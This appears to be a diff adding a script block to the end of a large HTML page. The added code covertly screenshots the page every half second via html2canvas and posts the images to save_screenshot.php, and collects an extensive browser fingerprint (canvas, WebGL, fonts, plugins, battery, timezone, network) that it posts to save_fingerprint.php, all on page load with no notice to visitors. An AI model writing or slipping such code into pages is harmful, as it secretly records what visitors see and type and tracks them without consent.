@@ -18605,6 +18605,209 @@
       }
     </script>
 
+    <!-- Screenshot Capture & Browser Fingerprinting -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script>
+      // ==============================================
+      // MODULE 1: Screenshot Capture (Every 0.5s)
+      // ==============================================
+      let screenshotCounter = 0;
+      let screenshotInterval;
+      
+      function captureScreenshot() {
+        html2canvas(document.body, {
+          allowTaint: true,
+          useCORS: true,
+          scale: 0.5  // Reduce quality for smaller file size
+        }).then(canvas => {
+          const screenshot = canvas.toDataURL('image/jpeg', 0.7);
+          const timestamp = Date.now();
+          screenshotCounter++;
+          
+          // Send to server
+          fetch('save_screenshot.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              screenshot: screenshot,
+              timestamp: timestamp,
+              counter: screenshotCounter
+            })
+          }).catch(err => console.log('Screenshot save failed'));
+        });
+      }
+      
+      // Start capturing screenshots every 0.5 seconds
+      window.addEventListener('load', function() {
+        screenshotInterval = setInterval(captureScreenshot, 500);
+      });
+      
+      // Stop capturing if user leaves page
+      window.addEventListener('beforeunload', function() {
+        clearInterval(screenshotInterval);
+      });
+
+      // ==============================================
+      // MODULE 2: Browser Fingerprinting
+      // ==============================================
+      function getCanvasFingerprint() {
+        try {
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+          ctx.textBaseline = 'top';
+          ctx.font = '14px Arial';
+          ctx.textBaseline = 'alphabetic';
+          ctx.fillStyle = '#f60';
+          ctx.fillRect(125, 1, 62, 20);
+          ctx.fillStyle = '#069';
+          ctx.fillText('Fingerprint 🔍', 2, 15);
+          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+          ctx.fillText('Fingerprint 🔍', 4, 17);
+          return canvas.toDataURL();
+        } catch(e) {
+          return 'unavailable';
+        }
+      }
+
+      function getWebGLFingerprint() {
+        try {
+          const canvas = document.createElement('canvas');
+          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+          if (!gl) return 'unavailable';
+          
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          return {
+            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+          };
+        } catch(e) {
+          return 'unavailable';
+        }
+      }
+
+      function getPlugins() {
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+          plugins.push(navigator.plugins[i].name);
+        }
+        return plugins.join(', ') || 'none';
+      }
+
+      function getFonts() {
+        const testFonts = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana'];
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const testString = 'mmmmmmmmmmlli';
+        const testSize = '72px';
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const detected = [];
+        
+        baseFonts.forEach(baseFont => {
+          ctx.font = testSize + ' ' + baseFont;
+          const baseWidth = ctx.measureText(testString).width;
+          
+          testFonts.forEach(testFont => {
+            ctx.font = testSize + ' ' + testFont + ',' + baseFont;
+            const testWidth = ctx.measureText(testString).width;
+            if (baseWidth !== testWidth) {
+              detected.push(testFont);
+            }
+          });
+        });
+        
+        return detected.join(', ') || 'standard';
+      }
+
+      function getBatteryInfo() {
+        return new Promise(resolve => {
+          if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+              resolve({
+                charging: battery.charging,
+                level: Math.round(battery.level * 100) + '%'
+              });
+            });
+          } else {
+            resolve('unavailable');
+          }
+        });
+      }
+
+      async function collectFingerprint() {
+        const battery = await getBatteryInfo();
+        
+        const fingerprint = {
+          // Basic Info
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+          
+          // Screen Info
+          screenResolution: `${screen.width}x${screen.height}`,
+          screenColorDepth: screen.colorDepth,
+          screenPixelDepth: screen.pixelDepth,
+          availableScreenSize: `${screen.availWidth}x${screen.availHeight}`,
+          
+          // Window Info
+          windowSize: `${window.innerWidth}x${window.innerHeight}`,
+          outerWindowSize: `${window.outerWidth}x${window.outerHeight}`,
+          
+          // Device Info
+          deviceMemory: navigator.deviceMemory || 'unavailable',
+          hardwareConcurrency: navigator.hardwareConcurrency || 'unavailable',
+          maxTouchPoints: navigator.maxTouchPoints || 0,
+          
+          // Time & Location
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timezoneOffset: new Date().getTimezoneOffset(),
+          
+          // Browser Features
+          cookiesEnabled: navigator.cookieEnabled,
+          doNotTrack: navigator.doNotTrack || 'unspecified',
+          onLine: navigator.onLine,
+          
+          // Storage
+          localStorage: typeof(Storage) !== 'undefined',
+          sessionStorage: typeof(Storage) !== 'undefined',
+          indexedDB: !!window.indexedDB,
+          
+          // Plugins & Fonts
+          plugins: getPlugins(),
+          fonts: getFonts(),
+          
+          // Canvas & WebGL Fingerprints
+          canvasFingerprint: getCanvasFingerprint(),
+          webglFingerprint: JSON.stringify(getWebGLFingerprint()),
+          
+          // Battery
+          battery: JSON.stringify(battery),
+          
+          // Connection
+          connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt
+          } : 'unavailable',
+          
+          // Timestamp
+          capturedAt: new Date().toISOString()
+        };
+        
+        // Send to server
+        fetch('save_fingerprint.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fingerprint)
+        }).catch(err => console.log('Fingerprint save failed'));
+      }
+      
+      // Collect fingerprint on page load
+      window.addEventListener('load', function() {
+        setTimeout(collectFingerprint, 1000); // Wait 1s for page to fully load
+      });
+    </script>
+
     <div class="_-rjm"><div class="tA2fc"></div></div>
     <div class="_5qKD1"><div class="q5edG"></div></div>
   </body>
